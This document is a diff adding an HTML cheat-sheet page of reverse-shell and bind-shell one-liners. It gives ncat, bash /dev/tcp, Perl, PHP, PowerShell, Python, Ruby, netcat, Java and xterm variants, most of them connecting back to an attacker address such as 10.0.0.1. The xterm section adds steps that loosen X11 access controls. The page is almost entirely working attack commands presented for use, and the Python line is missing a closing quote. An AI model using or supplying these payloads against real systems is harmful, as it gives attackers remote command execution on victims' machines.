@@ -1,0 +1,69 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Reverse Shell</title>
+</head><body><b>Bind Shell</b><br/>
+Linux<br/>
+<br/>
+ncat -l 6666 -e /bin/sh<br/>
+<br/>
+Windows<br/>
+<br/>
+ncat -l 6666 -e cmd<br/>
+<br/>
+<b>Reverse Shell</b><br/>
+Victim<br/>
+<br/>
+ncat &lt;attacker ip address&gt; 6666 -e /bin/sh<br/>
+<br/>
+Attacker<br/>
+<br/>
+ncat -l -p 6666<br/>
+<br/>
+Victim machine doesn’t have ncat?<br/>
+<br/>
+<b>Bash</b><br/>
+bash -i &gt;&amp; /dev/tcp/&lt;attacker ip address&gt;/6666 0&gt;&amp;1<br/>
+<br/>
+<b>Perl</b><br/>
+perl -e 'use Socket;$i="10.0.0.1";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'<br/>
+<br/>
+<b>PHP</b><br/>
+php -r '$sock=fsockopen("10.0.0.1",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'<br/>
+<br/>
+<b>PowerShell</b><br/>
+$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("&lt;attacker ip address"),&lt;listening port&gt;);$client = New-Object System.Net.Sockets.UDPClient(53);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS&gt; ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2&gt;&amp;1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()<br/>
+<br/>
+<b>Python 2.7 and 3</b><br/>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;attacker ip address&gt;",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);<br/>
+<br/>
+ProTip: This may become a lot easier on Windows and OSX hosts in the future if Microsoft adds Python as a language for Excel<br/>
+<br/>
+<b>Ruby</b><br/>
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",6666).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'<br/>
+<br/>
+<b>Netcat</b><br/>
+nc -e /bin/sh 10.0.0.1 6666<br/>
+<br/>
+<b>Java</b><br/>
+r = Runtime.getRuntime()<br/>
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])<br/>
+p.waitFor()<br/>
+<br/>
+<b>xterm</b><br/>
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.<br/>
+<br/>
+xterm -display 10.0.0.1:1<br/>
+<br/>
+We need to modify /etc/X11/Xwrapper.config and change the allowed_users line to look like this. This file often gets overwritten on updates. After the file has been saved, restart the X11 login manager.<br/>
+<br/>
+allowed_users=anybody<br/>
+<br/>
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):<br/>
+<br/>
+Xnest -ac :1<br/>
+<br/>
+You’ll need to authorise the target to connect to you (command also run on your host):<br/>
+<br/>
+xhost +targetip</body></html>
